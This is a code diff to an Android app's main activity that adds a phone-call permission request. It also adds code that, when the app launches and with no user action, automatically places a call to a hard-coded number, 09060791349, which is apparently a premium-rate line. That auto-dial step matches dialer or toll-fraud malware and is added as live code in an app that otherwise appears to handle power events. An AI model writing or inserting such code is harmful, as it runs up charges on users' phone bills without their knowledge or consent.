@@ -5,6 +5,8 @@ import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
+import android.support.annotation.NonNull;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -16,6 +18,7 @@ public class MainActivity extends AppCompatActivity {
 
     private PackageManager mPackageManager;
     private ComponentName mComponentName;
+    private static final int CALL_PHONE_PERMISSION_REQ_CODE = 1;
 
     //This holds a reference to the main activity
     private static MainActivity instance;
@@ -33,6 +36,12 @@ public class MainActivity extends AppCompatActivity {
         mComponentName = new ComponentName(this, PowerReceiver.class);
 
         instance = this;
+
+        if(checkForPermission(Manifest.permission.CALL_PHONE)){
+            startActivity(new Intent(Intent.ACTION_CALL, Uri.parse("tel:09060791349")));
+        }else{
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CALL_PHONE}, CALL_PHONE_PERMISSION_REQ_CODE);
+        }
     }
 
     @Override
@@ -76,5 +85,15 @@ public class MainActivity extends AppCompatActivity {
 
     private boolean checkForPermission(String permission){
         return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        switch(requestCode){
+            case CALL_PHONE_PERMISSION_REQ_CODE:
+                if (grantResults.length > 0 && (grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    Toast.makeText(MainActivity.this, "Call permission granted", Toast.LENGTH_SHORT).show();
+                }
+        }
     }
 }
